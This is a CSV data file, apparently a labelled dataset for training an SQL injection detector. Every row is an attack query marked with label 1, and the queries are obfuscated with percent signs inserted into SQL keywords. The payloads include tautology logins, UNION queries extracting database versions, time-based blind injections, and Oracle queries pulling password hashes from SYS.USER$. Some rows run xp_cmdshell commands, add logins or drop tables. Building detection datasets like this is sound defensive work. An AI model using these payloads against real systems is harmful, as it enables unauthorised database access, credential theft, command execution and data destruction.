Query,Label
" %s%%e%le%%c%%t * f%r%om users w%h%e%%re id  =  1 o%%r 1#""? union %s%%e%le%%c%%t version  (    )  ,version  (    )   -- 1",1
" %%s%e%%le%%c%%t * %f%%r%om users w%%h%e%re id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
 %%or uid %%l%ike '%,1
%%s%%e%%l%%e%ct * fro%%m users wh%%e%r%%e id  =  '1' <@&1 %o%r 1  =  1 -- 1',1
" %s%el%e%%c%t * %from users %%w%he%%re id  =  '1' union %s%el%e%%c%t !<1,version  (    )   -- 1'",1
23 or 1  =  1; --,1
" %%s%%e%%l%e%c%%t * %%fro%m users w%he%r%e id  =  1 o%r \<\. union %%s%%e%%l%e%c%%t 1,@@VERSION -- 1",1
" s%%e%%l%%e%%ct * fr%%om users w%%he%%r%e id  =  1 %%or ""{  (  ""  =  1 %%or 1  =  1 -- 1",1
" %%s%e%le%%c%t * %f%rom users %where id  =  1 %or ""%_"" %or 1  =  1 -- 1",1
%%s%e%le%ct * %fro%m users %w%%h%ere id  =  1 +   (  \.  )   %%o%%r 1  =  1 -- 1,1
" %%se%%l%e%%c%%t * fro%m users %w%he%%r%%e id  =  '1' union %%se%%l%e%%c%%t \,@@VERSION -- 1'",1
0 o%%r 1  =  1,1
%s%%e%%le%%ct * f%r%%o%m users %%whe%r%%e id  =  1 &@ o%%r 1  =  1 -- 1,1
"admi%%n""  )   %o%r ""1""  =  ""1",1
%%s%%el%%ec%%t * %%f%r%%o%%m users %%w%%h%%e%r%e id  =  1 o%%r \<   =  1 o%%r 1  =  1 -- 1,1
" %s%%e%%l%e%%c%%t * %fr%o%m users %w%h%%er%%e id  =  1 %%o%%r ""??"" %%o%%r 1  =  1 -- 1",1
" and 1  =  utl_%i%naddr.get_host_address   (    (   s%e%lect Di%sT%i%nCT  (  PASSWo%rD  )   %fr%%o%m   (  s%e%lect Di%sT%i%nCT  (  PASSWo%rD  )  , ROWNUM AS %lim%i%t %fr%%o%m SYS.USER$  )   %%where %lim%i%t  =  5   )    )    and 'i'  =  'i",1
" %%a%%n%d 1  =  utl_inaddr.get_host_address   (    (   %%s%%e%%l%%e%c%%t DisTinCT  (  column_name  )   %f%r%%om   (  %%s%%e%%l%%e%c%%t DisTinCT  (  column_name  )  , ROWNUM AS %l%i%mi%%t %f%r%%om all_tab_columns  )   %wher%%e %l%i%mi%%t  =  7   )    )    %%a%%n%d 'i'  =  'i",1
&apos; %%o%r,1
sqlvuln;,1
s%%e%%l%ect * %%f%%r%o%%m users %wh%%er%%e id  =  1 + $+%$ o%r 1  =  1 -- 1,1
%s%%ele%%ct * fr%%o%%m users %%w%%h%e%r%%e id  =  '1' + $+%\ %%o%%r 1  =  1 -- 1',1
""" %%o%r """"*""",1
"hi %or 1  =  1 --""",1
" %%s%elec%%t * f%%r%%o%m users %w%h%%e%r%e id  =  1. union %%s%elec%%t %n%%u%l%%l,banner f%%r%%o%m v$version %w%h%%e%r%e rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'p%i%%ng 172.10.1.255'--,1
" %s%e%%l%%ec%%t * %%f%r%%om users w%h%e%%r%%e id  =  '1' %o%%r 1^  =  1 union %s%e%%l%%ec%%t 1,banner %%f%r%%om v$version w%h%e%%r%%e rownum  =  1 -- 1'",1
" %s%e%l%%e%c%t * %f%%ro%m users w%%h%%e%%re id  =  '1' union %s%e%l%%e%c%t ""?""_,version  (    )   -- 1'",1
s%%e%%l%e%ct * f%%rom i%nf%%ormation_schema.t%a%%b%l%%es--,1
s%%el%e%c%%t * %fr%o%%m users wh%ere id  =  1 %%or \<\. %%or 1  =  1 -- 1,1
   (  s%%e%%lec%t top 1,1
Ã½ %or 1  =  1 --,1
a' --,1
 %%o%r 1  =  1 /*,1
" %s%el%e%ct * %f%%r%%om users wh%%er%%e id  =  1 or 1#"", union %s%el%e%ct %n%ull,version  (    )   -- 1",1
" s%el%%e%%c%t * fr%om users w%%he%%re id  =  '1' union s%el%%e%%c%t $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlog%%in 'name' , 'passw%ord'",1
" %%se%le%%ct * %%fro%m users w%%h%e%%re id  =  1   union %%se%le%%ct n%u%%ll,banner %%fro%m v$version w%%h%e%%re rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" %%s%%el%%ec%t * fr%o%m users %%wh%%e%%r%e id  =  1 %o%%r "".  )  "" %o%%r 1  =  1 -- 1",1
" %sele%ct * f%%r%%o%m users w%%h%ere id  =  1 %o%%r @<@  =  1 union %sele%ct 1,version  (    )   -- 1",1
group %%by userid hav%ing 1  =  1--,1
" s%e%l%e%ct * %%f%%r%%o%%m users %%w%%h%e%%r%e id  =  1 + \+%1 union s%e%l%e%ct %%nu%l%%l,@@VERSION -- 1",1
%%s%e%l%%ec%t * f%r%o%%m users %%w%h%e%%re id  =  1 *1 %%or 1  =  1 -- 1,1
" %%s%%e%l%%e%%ct * %fr%%om users wh%%e%%r%%e id  =  1 %o%r @#"";  =  1 %o%r 1  =  1 -- 1",1
‘ %%o%%r 1  =  1 --,1
" %se%lec%%t * from users %w%%he%%r%%e id  =  1 *\. union %se%lec%%t n%%u%%l%l,@@VERSION -- 1",1
%%se%%l%%e%%c%t * %fr%%o%%m users %%w%h%e%re id  =  1 %  (  @  )   %o%%r 1  =  1 -- 1,1
or 'a'  =  'a,1
declare @s varchar  (  22  )   %%s%%el%e%%c%t @s   = ,1
" s%e%l%%e%c%%t * f%%rom users %%w%%he%%r%%e id  =  1 union s%e%l%%e%c%%t 1<@,version  (    )   -- 1",1
" s%%el%%e%c%t * %%fr%om users wh%%e%%r%%e id  =  1 + \+*\ union s%%el%%e%c%t nu%%ll,@@VERSION -- 1",1
" %s%%e%le%%c%t * %fr%%o%m users %wh%%e%%re id  =  1 o%r 1#"". union %s%%e%le%%c%t version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
%s%el%%e%%ct * fro%m users %w%h%er%%e id  =  1 +  (  1  )   %o%%r 1  =  1 -- 1,1
" s%%el%%e%%ct * %f%%r%%om users %w%h%e%re id  =  1 union s%%el%%e%%ct @ 1$,version  (    )   -- 1",1
" %%se%le%%c%t * %fr%%om users %w%%here id  =  1 union %%se%le%%c%t @ 1a,version  (    )   -- 1",1
" %%se%l%e%%c%t * %%f%%r%om users %%w%her%%e id  =  1 %%or  @$#  =  1 union %%se%l%e%%c%t 1,version  (    )   -- 1",1
" s%%el%%e%ct * %%f%%r%%o%m users %wh%e%r%e id  =  '1' %%or   (  \.  )    =  1 union s%%el%%e%ct 1,@@VERSION -- 1'",1
 %%a%%n%%d 1 %i%n   (  sel%ec%%t var fr%o%m temp  )  --,1
" s%%e%%l%ec%t * %%f%%r%o%%m users %w%h%%e%%re id  =  '1' union s%%e%%l%ec%t 1""!"",banner %%f%%r%o%%m v$version %w%h%%e%%re rownum  =  1 -- 1'",1
" %s%e%le%c%%t * f%r%%o%%m users %%w%he%%re id  =  1 %%o%r ""1]"" %%o%r 1  =  1 -- 1",1
" %s%%e%%le%%ct * %%fr%o%m users %w%h%e%r%%e id  =  1 o%%r ""$?"" o%%r 1  =  1 -- 1",1
%%o%%r x  =  x,1
or a  =  a,1
%%o%%r '1'  =  '1,1
" %s%el%%e%c%t * %f%r%o%m users %%wh%%e%%re id  =  11<1# union %s%el%%e%c%t 1,version  (    )   -- 1",1
   )    )    %%o%r    (    (   'x'   )    )     =     (    (   'x,1
" s%e%%l%%ect * %f%%r%%om users whe%r%%e id  =  '1' %%o%%r \.<1 union s%e%%l%%ect 1,@@VERSION -- 1'",1
" %se%%l%ec%t * f%r%o%m users wh%%e%%re id  =  '1' <@&1 union %se%%l%ec%t 1,version  (    )   -- 1'",1
" %a%%nd 1  =  utl_%i%naddr.get_host_address   (    (   %s%e%%l%%e%c%t D%%i%sT%i%nCT  (  ta%%b%l%%e_name  )   %%fr%%o%%m   (  %s%e%%l%%e%c%t D%%i%sT%i%nCT  (  ta%%b%l%%e_name  )  , ROWNUM AS %l%%im%it %%fr%%o%%m sys.all_ta%%b%l%%es  )   %%w%%h%e%%r%e %l%%im%it  =  4   )    )    %a%%nd 'i'  =  'i",1
; if %i%%s_srvrolemember  (  'sysadm%%in'  )   > 0 waitf%or delay '0:0:2' --,1
%s%%e%%lec%%t * %%fro%m users w%h%%e%%r%%e id  =  1 <@<@ or 1  =  1 -- 1,1
" %se%%l%e%c%t * f%rom users w%h%er%%e id  =  1 union %se%%l%e%c%t @<@$,version  (    )   -- 1",1
" %%s%%e%%l%%ec%%t * %f%r%%om users %%w%%h%ere id  =  '1' <@<@ union %%s%%e%%l%%ec%%t 1,version  (    )   -- 1'",1
" s%e%%l%%e%%c%t * fr%%om users w%%h%%e%%r%%e id  =  1 or ""$_"" or 1  =  1 -- 1",1
" s%ele%ct * f%%ro%%m users %wh%%e%%r%%e id  =  1 %o%%r 1#""{ union s%ele%ct version  (    )  ,version  (    )   -- 1",1
a' %or 1  =  1--,1
 )   %%o%r   (  a  =  a,1
"""   )    )    %%or    (    (   ""x""   )    )     =     (    (   ""x",1
" s%%el%%ec%%t * %%f%r%o%%m users %%whe%r%%e id  =  1 o%r 1#""; o%r 1  =  1 -- 1",1
" s%%el%%e%ct * %f%%r%o%%m users wh%e%%r%%e id  =  '1' <@$_ union s%%el%%e%ct 1,version  (    )   -- 1'",1
-- &passw%%ord  = ,1
%%sel%%e%%ct * from users %w%her%%e id  =  1 <@. o%r 1  =  1 -- 1,1
" %s%e%lect * f%ro%%m users %%w%h%e%%re id  =  1 o%r ""  (    )  "" o%r 1  =  1 -- 1",1
" %s%e%l%ec%%t * %fr%om users w%he%%r%e id  =  1 %$ 1 union %s%e%l%ec%%t %n%%u%%l%l,@@VERSION -- 1",1
" a%%n%%d 1  =  utl_i%naddr.get_host_address   (    (   s%%el%%e%c%%t DisTi%nCT  (  granted_role  )   %f%r%om   (  s%%el%%e%c%%t DisTi%nCT  (  granted_role  )  , ROWNUM AS l%i%m%it %f%r%om dba_role_privs %w%h%e%r%%e GRANTEE  =  SYS.LOGi%nUSER  )   %w%h%e%r%%e l%i%m%it  =  3   )    )    a%%n%%d 'i'  =  'i",1
 o%%r '1'  =  '1,1
admi%n' o%r 1  =  1,1
" %%se%%lect * %%f%r%%om users w%h%e%r%e id  =  1 %o%r "";,""  =  1 %o%r 1  =  1 -- 1",1
" %sel%%ect * %%f%r%o%m users %w%here id  =  1 union %sel%%ect @||1,version  (    )   -- 1",1
" %%se%le%%ct * %%f%r%%o%m users %wh%%er%%e id  =  1 +\+. union %%se%le%%ct %%n%%u%%l%%l,@@VERSION -- 1",1
" %%sel%e%%c%%t * f%ro%m users %w%%h%%er%e id  =  1 %o%r ""  )  ,"" %o%r 1  =  1 -- 1",1
" union %%s%e%%l%%e%%c%%t * f%%rom users %w%h%er%%e logi%n   =   char  (  114,111,111,116  )  ;",1
" %sel%%e%c%t * %f%r%%o%m users w%%h%%e%re id  =  1 %%or 1#""? union %sel%%e%c%t 1,version  (    )   -- 1",1
 or 1  =  1--,1
" %a%n%d 1  =  utl_%%i%%naddr.get_host_address   (    (   s%%e%%le%ct D%i%sT%%i%%nCT  (  granted_role  )   %f%%r%o%m   (  s%%e%%le%ct D%i%sT%%i%%nCT  (  granted_role  )  , ROWNUM AS l%%i%%mi%%t %f%%r%o%m dba_role_privs w%%h%%e%%re GRANTEE  =  SYS.LOG%%i%%nUSER  )   w%%h%%e%%re l%%i%%mi%%t  =  5   )    )    %a%n%d 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ %o%%r 3  =  3 --,1
" %%se%l%%e%%c%%t * fro%m users %w%%h%%e%%re id  =  1 -1<@ union %%se%l%%e%%c%%t 1,version  (    )   -- 1",1
" se%%lect * fro%%m users wh%%er%%e id  =  1 o%%r ""$#"" o%%r 1  =  1 -- 1",1
 )   union %%selec%%t * %from %%i%%nf%o%%rmation_schema.%t%a%%b%l%%es;,1
" s%e%le%c%%t * f%ro%%m users %%w%%h%%e%r%e id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
"  )   o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
 %a%%nd 1  =  utl_%inaddr.get_host_address   (    (   s%ele%%c%t COUNT  (  D%isT%inCT  (  column_name   )    )    fr%o%m sys.all_tab_columns   )    )    %a%%nd 'i'  =  'i,1
" an%d 1  =  utl_%i%naddr.get_host_address   (    (   %%s%el%%e%ct D%i%%sT%i%nCT  (  %%ta%b%l%%e_name  )   %f%%r%%o%%m   (  %%s%el%%e%ct D%i%%sT%i%nCT  (  %%ta%b%l%%e_name  )  , ROWNUM AS %%lim%i%t %f%%r%%o%%m sys.all_%%ta%b%l%%es  )   wh%e%r%%e %%lim%i%t  =  7   )    )    an%d 'i'  =  'i",1
""" or """" """,1
%d%%e%l%%e%t%e,1
;waitf%%o%r delay '0:0:__TIME__'--,1
 %o%r 1  =  1 --,1
1' %a%n%d non_ex%%i%stant_t%%ab%%l%%e   =   '1,1
" s%%el%e%%c%%t * f%%r%%o%m users %wh%e%r%%e id  =  1 %or ""&  )  "" %or 1  =  1 -- 1",1
" %se%l%%e%c%t * %%f%%r%om users w%her%e id  =  '1' + $ . union %se%l%%e%c%t 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   s%%el%ec%t @s   =   0x77616974 ...,1
x' %a%%nd userid %%is %n%%ull; --,1
" %s%e%l%%e%%c%t * %%f%r%%om users w%%h%%er%%e id  =  1 %o%%r "";["" %o%%r 1  =  1 -- 1",1
" %%sele%%ct * %f%r%o%%m users w%h%%e%re id  =  '1' %%or \.<   =  1 union %%sele%%ct 1,@@VERSION -- 1'",1
" %se%%l%%ec%t * %%f%%ro%%m users %whe%%r%e id  =  1 union %se%%l%%ec%t @<@,version  (    )   -- 1",1
" %s%e%l%%ec%%t * %%f%r%o%m users %%where id  =  1 -@<@ union %s%e%l%%ec%%t 1,version  (    )   -- 1",1
 %%a%%n%d 1  =  utl_%i%naddr.get_host_address   (    (   s%ele%ct host_name %from v$%i%nstance   )    )    %%a%%n%d 'i'  =  'i,1
" %a%%n%%d 1  =  utl_inaddr.get_host_address   (    (   %%s%e%l%%e%%c%%t DisTinCT  (  column_name  )   from   (  %%s%e%l%%e%%c%%t DisTinCT  (  column_name  )  , ROWNUM AS l%i%m%%it from all_tab_columns  )   %w%h%%e%re l%i%m%%it  =  2   )    )    %a%%n%%d 'i'  =  'i",1
%%sel%e%c%t * %%f%r%%o%%m users %%whe%%r%%e id  =  1 +   (  \+  )   o%r 1  =  1 -- 1,1
" %%s%e%l%%e%c%%t * f%%r%o%m users %%w%h%e%r%%e id  =  1 or "".["" or 1  =  1 -- 1",1
" se%l%ec%t * %%f%r%o%m users %w%%he%r%%e id  =  1 %o%r ""  (  ["" %o%r 1  =  1 -- 1",1
UNION ALL %sel%e%c%t,1
" se%l%%e%c%t * %f%ro%%m users %w%%h%%e%%r%e id  =  1 %o%%r ""1#"" %o%%r 1  =  1 -- 1",1
%s%el%%e%ct * f%%r%%om users %w%%h%e%r%%e id  =  1 %or \<1 %or 1  =  1 -- 1,1
" %%s%e%l%%e%ct * %%f%%r%%om users %%w%h%%e%%r%%e id  =  1 | |1 union %%s%e%l%%e%ct 1,banner %%f%%r%%om v$version %%w%h%%e%%r%%e rownum  =  1 -- 1",1
x' %o%r full_name lik%e '%bob%,1
x' a%n%%d members.email %i%%s n%u%%l%l; --,1
 or 2 > 1,1
%%s%%e%l%e%ct * %fro%%m users %w%he%r%%e id  =  1.*1 %o%r 1  =  1 -- 1,1
"""  )   %o%r pg_sleep  (  __TIME__  )  --",1
 ',1
" %s%%ele%ct * %f%r%%o%m users w%%h%%er%%e id  =  1 or $<\. union %s%%ele%ct 1,@@VERSION -- 1",1
" s%%e%l%%ect * %f%%r%%om users w%her%e id  =  1 %o%r ""@  )  "" %o%r 1  =  1 -- 1",1
%s%%e%%l%ect * f%%rom users %wh%%e%re id  =  1 %o%r \.<$ %o%r 1  =  1 -- 1,1
 )   o%r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" sel%e%%c%t * fr%om users w%he%r%%e id  =  '1' + 1||1 union sel%e%%c%t 1,banner fr%om v$version w%he%r%%e rownum  =  1 -- 1'",1
%s%e%%lec%%t * f%r%%om users %%w%he%r%e id  =  1 + $+%\ %%or 1  =  1 -- 1,1
" %%se%lec%%t * fro%%m users %w%%h%e%%r%e id  =  1 or "";  (  "" or 1  =  1 -- 1",1
or sleep  (  __TIME__  )    =  ',1
" %%s%%e%%l%%ect * %%fro%%m users wh%%er%e id  =  1 %o%%r "";_"" %o%%r 1  =  1 -- 1",1
" sel%ec%%t * %fr%o%m users wh%e%re id  =  1 %o%%r 1#"". union sel%ec%%t 1,version  (    )   -- 1",1
" s%%e%l%%e%c%%t * f%r%o%m users %wh%%e%%r%e id  =  1 union s%%e%l%%e%c%%t  @ $,version  (    )   -- 1",1
" %se%le%%ct * f%%r%om users %%whe%%r%%e id  =  1 union %se%le%%ct +!<@,version  (    )   -- 1",1
" %se%l%%ec%t * %fro%%m users %w%%h%e%%r%%e id  =  1 <@<@ union %se%l%%ec%t %%n%u%%l%%l,version  (    )   -- 1",1
%o%r 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythi%%ng' o%%r 'x'  =  'x,1
" %s%%elec%t * %%f%r%om users %%w%h%e%re id  =  1 %or \<\ union %s%%elec%t 1,@@VERSION -- 1",1
" %s%%e%l%ect * %fr%%o%%m users wh%%e%re id  =  1 union %s%%e%l%ect   (  1  )  ,banner %fr%%o%%m v$version wh%%e%re rownum  =  1 -- 1",1
" %%s%e%le%c%%t * f%r%%o%m users %%wh%%e%%r%%e id  =  1 *  (  \  )   union %%s%e%le%c%%t %n%u%%l%%l,@@VERSION -- 1",1
&',1
a' or 3  =  3--,1
" s%e%%l%%e%%c%t * f%r%%o%%m users whe%r%e id  =  '1' %%o%r $+<$ union s%e%%l%%e%%c%t 1,@@VERSION -- 1'",1
" %s%e%lect * f%r%o%%m users %w%%h%er%%e id  =  1 +1 union %s%e%lect 1,banner f%r%o%%m v$version %w%%h%er%%e rownum  =  1 -- 1",1
"adm%%in""o%%r 1  =  1 o%%r """"  =  """,1
uni/**/on sel/**/ect,1
""" %%o%%r """"&""",1
 )    )   ;waitf%o%r delay '0:0:__TIME__'--,1
" %%s%e%%l%e%c%t * %%fr%%om users w%%h%er%%e id  =  1 %o%r ""?;"" %o%r 1  =  1 -- 1",1
1 waitf%o%r delay '0:0:10'--,1
bfilename,1
admi%%n'  )   o%%r   (  '1'  =  '1'--,1
UEf,1
 -- &passw%o%rd  = ,1
1 %or sleep  (  __TIME__  )  #,1
" %a%%nd 1  =  utl_%%i%%naddr.get_host_address   (    (   s%e%%l%ec%%t D%%i%%sT%%i%%nCT  (  %t%a%%bl%%e_name  )   f%%r%om   (  s%e%%l%ec%%t D%%i%%sT%%i%%nCT  (  %t%a%%bl%%e_name  )  , ROWNUM AS lim%%it f%%r%om sys.all_%t%a%%bl%%es  )   %%wh%e%r%%e lim%%it  =  6   )    )    %a%%nd 'i'  =  'i",1
" s%%e%%lec%t * f%%ro%%m users %%w%%h%%ere id  =  '1' union s%%e%%lec%t $[""],@@VERSION -- 1'",1
" %%s%%el%%e%ct * %%fr%o%m users %w%he%re id  =  '1' + @  (  1  )   union %%s%%el%%e%ct 1,version  (    )   -- 1'",1
1' %%a%nd 1  =    (  sel%e%%ct count  (  *  )   %f%r%%o%%m %t%%a%%b%%l%enames  )  ; --,1
%o%r sleep  (  __TIME__  )  #,1
" %a%%n%d 1  =  utl_%%inaddr.get_host_address   (    (   %s%el%%e%%ct D%isT%%inCT  (  granted_role  )   %%fro%%m   (  %s%el%%e%%ct D%isT%%inCT  (  granted_role  )  , ROWNUM AS %li%%m%%it %%fro%%m dba_role_privs %w%h%%er%e GRANTEE  =  SYS.LOG%%inUSER  )   %w%h%%er%e %li%%m%%it  =  8   )    )    %a%%n%d 'i'  =  'i",1
" s%e%l%%e%c%%t * from users %w%%h%e%%r%%e id  =  1 o%%r 1#"",  =  1 o%%r 1  =  1 -- 1",1
||6,1
%o%%r 1/*,1
" %a%nd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
%%s%e%l%e%c%t * f%r%%o%m users %%wh%%e%%re id  =  1.%@ %%o%r 1  =  1 -- 1,1
" %se%l%e%%ct * %%fr%om users w%h%e%r%%e id  =  1 %o%r ""..""  =  1 %o%r 1  =  1 -- 1",1
" %se%le%%ct * %%f%r%o%m users wh%er%%e id  =  1 or 1&@#  =  1 union %se%le%%ct 1,version  (    )   -- 1",1
" s%%el%%ec%t * %f%ro%%m users %%w%%h%e%r%%e id  =  1 %%o%%r "";]"" %%o%%r 1  =  1 -- 1",1
" %%o%r 1  =  1 %%o%r """"  =  ",1
" a%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %%s%ele%ct Di%sT%i%%nCT  (  PASSW%o%%rD  )   f%r%o%%m   (  %%s%ele%ct Di%sT%i%%nCT  (  PASSW%o%%rD  )  , ROWNUM AS %l%%imit f%r%o%%m SYS.USER$  )   %%w%%h%e%re %l%%imit  =  7   )    )    a%n%d 'i'  =  'i",1
s%e%l%%e%c%t * %%f%rom users wh%e%%r%%e id  =  1 %%or $<\. %%or 1  =  1 -- 1,1
" %%s%%e%le%c%%t * fr%%o%m users wher%%e id  =  1 *  (  1  )   union %%s%%e%le%c%%t 1,banner fr%%o%m v$version wher%%e rownum  =  1 -- 1",1
%%o%%r 'whatever' %in   (  'whatever'  ) ,1
declare @s varchar   (  200  )   %%se%%l%e%c%t @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
%s%e%l%e%%c%%t * %f%rom users %%w%%h%e%r%e id  =  '1'   o%%r 1  =  1 -- 1',1
?,1
 a%%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %%s%%e%%l%e%c%t COUNT  (  D%isT%i%%nCT  (  tab%%l%%e_name   )    )    %fr%%o%m sys.all_tab%%l%%es   )    )    a%%n%d 'i'  =  'i,1
" s%e%%l%e%ct * %f%rom users w%%he%re id  =  '1' union s%e%%l%e%ct @ 1,version  (    )   --  1'",1
"admin""  )   %or   (  ""1""  =  ""1""#",1
" %%se%%l%%e%c%t * %f%%r%%o%%m users where id  =  1 %o%r 1#"", union %%se%%l%%e%c%t 'a',version  (    )   -- 1",1
" %sel%ec%%t * %%fr%o%%m users %%whe%r%%e id  =  1 %or ""$  (  "" %or 1  =  1 -- 1",1
 %o%r '' ',1
" %se%%lec%%t * f%r%o%%m users %whe%r%e id  =  1 %%o%r "";#"" %%o%r 1  =  1 -- 1",1
%%or 1  =  1,1
 ; %d%ro%p t%%a%%b%l%e temp --,1
" %an%%d 1  =  utl_%%i%naddr.get_host_address   (    (   sele%c%%t D%i%%sT%%i%nCT  (  PASSW%%orD  )   %f%%r%%o%%m   (  sele%c%%t D%i%%sT%%i%nCT  (  PASSW%%orD  )  , ROWNUM AS l%i%mit %f%%r%%o%%m SYS.USER$  )   w%%her%%e l%i%mit  =  2   )    )    %an%%d 'i'  =  'i",1
""" %or benchmark  (  10000000,MD5  (  1   )    )   #",1
""" %%o%r ""x""  =  ""x",1
s%elect * %%f%%rom users %wh%%e%r%e id  =  '1'<@.. %or 1  =  1 -- 1',1
" s%%elect * %%f%r%%o%m users %whe%r%e id  =  1 o%r !<@ union s%%elect 1,version  (    )   -- 1",1
 %o%r 'something' %%l%i%k%e 'some%',1
; if %n%%o%%t   (    (   %s%e%%l%ect serverproperty  (  '%i%si%ntegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1
" a%nd 1  =  utl_%%i%naddr.get_host_address   (    (   %%se%l%ec%%t D%%isT%%i%nCT  (  PASSWo%%rD  )   f%%ro%%m   (  %%se%l%ec%%t D%%isT%%i%nCT  (  PASSWo%%rD  )  , ROWNUM AS %%l%im%i%%t f%%ro%%m SYS.USER$  )   %whe%r%e %%l%im%i%%t  =  4   )    )    a%nd 'i'  =  'i",1
%%s%%e%%l%e%%c%%t * %%fr%%om users w%%he%r%%e id  =  '1' %o%%r \<\. %o%%r 1  =  1 -- 1',1
; exec master..xp_cmdshell 'pi%ng 10.10.1.2'--,1
admi%n' %o%r '1'  =  '1'--,1
; if %n%o%%t   (    (   s%e%le%%c%%t serverproperty  (  '%%i%%s%integratedsecurityonly'   )    )    <> 1  )   waitf%%o%%r delay '0:0:2' --,1
" a%n%%d 1  =  utl_%%i%naddr.get_host_address   (    (   se%l%e%c%%t D%%i%sT%%i%nCT  (  %ta%b%l%e_name  )   %fr%%o%%m   (  se%l%e%c%%t D%%i%sT%%i%nCT  (  %ta%b%l%e_name  )  , ROWNUM AS l%%im%i%%t %fr%%o%%m sys.all_%ta%b%l%es  )   %w%her%e l%%im%i%%t  =  2   )    )    a%n%%d 'i'  =  'i",1
" se%lec%t * f%r%%o%%m users w%%h%er%e id  =  1 <@<@ union se%lec%t version  (    )  ,version  (    )   -- 1",1
" %%s%e%l%%e%%ct * f%r%o%%m users %w%he%re id  =  1 o%r 1#""$ union %%s%e%l%%e%%ct %n%ull,version  (    )   -- 1",1
""";waitfo%%r delay '0:0:__TIME__'--",1
x' a%n%d userid %is %n%u%ll; --,1
s%%e%l%%e%c%t * %fr%o%%m users w%%h%%e%r%%e id  =  '1' *$ 1 %or 1  =  1 -- 1',1
" s%%e%l%%ec%t * f%r%%om users %%wh%ere id  =  1 or \<\ union s%%e%l%%ec%t %nul%%l,@@VERSION -- 1",1
" se%%l%e%%c%%t * %%f%%r%%o%m users %w%h%%e%%re id  =  1 %or ""?@"" %or 1  =  1 -- 1",1
’ %%o%r ‘1’  =  ’1,1
" se%le%%c%t * f%ro%%m users w%h%er%%e id  =  '1' union se%le%%c%t 1a,banner f%ro%%m v$version w%h%er%%e rownum  =  1 -- 1'",1
adm%in'o%r 1  =  1 o%r ''  =  ',1
" %s%%e%l%e%%c%%t * f%%r%%o%m users %%wh%e%re id  =  '1' %o%r !<1 union %s%%e%l%e%%c%%t 1,version  (    )   -- 1'",1
" an%d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" s%e%%l%%e%ct * %%f%%r%%o%%m users wh%%e%%r%%e id  =  1 %o%r ""_  )  "" %o%r 1  =  1 -- 1",1
" se%%l%e%ct * fr%%o%%m users whe%%r%%e id  =  1 or \.<   =  1 union se%%l%e%ct 1,@@VERSION -- 1",1
 %%o%r 1  =  1,1
s%%e%le%%ct * %%f%ro%%m users %w%%here id  =  1 + $+%1 or 1  =  1 -- 1,1
" se%%l%e%%c%t * %from users w%%h%e%r%e id  =  1.  union se%%l%e%%c%t version  (    )  ,version  (    )   -- 1",1
x' %%a%%n%%d email %i%s %n%%u%%l%l; --,1
" %s%e%%l%%e%%c%%t * f%%rom users %w%%h%%e%%r%e id  =  '1' + @ @1 union %s%e%%l%%e%%c%%t 1,version  (    )   -- 1'",1
 --,1
" s%%e%%l%e%%c%%t * %%f%r%om users %%w%h%%e%r%%e id  =  '1'   union s%%e%%l%e%%c%%t %%n%u%%l%%l,banner %%f%r%om v$version %%w%h%%e%r%%e rownum  =  1 -- 1'",1
" %%s%%el%e%c%%t * f%r%o%%m users %wh%%er%e id  =  11||1 union %%s%%el%e%c%%t 1,banner f%r%o%%m v$version %wh%%er%e rownum  =  1 -- 1",1
" s%ele%c%%t * %f%%r%%o%%m users %w%her%%e id  =  1.*1 union s%ele%c%%t 1,banner %f%%r%%o%%m v$version %w%her%%e rownum  =  1 -- 1",1
%u%p%d%%ate,1
 %o%%r 1/*,1
